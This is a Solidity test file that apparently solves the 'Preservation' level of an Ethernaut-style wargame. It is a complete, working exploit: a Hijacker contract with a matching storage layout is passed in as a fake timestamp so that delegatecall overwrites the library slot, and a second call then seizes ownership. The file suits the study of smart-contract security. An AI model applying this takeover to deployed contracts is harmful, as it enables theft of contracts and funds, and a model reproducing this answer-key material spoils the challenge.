// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {BaseTest} from "./BaseTest.sol";
import {PreservationFactory} from "../src/levels/16-PreservationFactory.sol";
import {Preservation} from "../src/levels/16-Preservation.sol";

contract Hijacker {
    address private padding1;
    address private padding2;
    address private owner;
    address immutable private newOwner;

    constructor(address newOwner_){
        newOwner = newOwner_;
    }

    function setTime(uint256) public {
        owner = newOwner;
    }
}

contract PreservationSolution is BaseTest {

    function solution(address payable target_) internal override{
        Preservation target = Preservation(target_);
        Hijacker hijacker = new Hijacker(attacker);
        uint256 spookyTimestamp = uint256(uint160(address(hijacker)));
        target.setFirstTime(spookyTimestamp);
        target.setFirstTime(0);
    }

    function construction() internal override returns(address payable ) {
        return payable(address(new PreservationFactory()));
    }
}
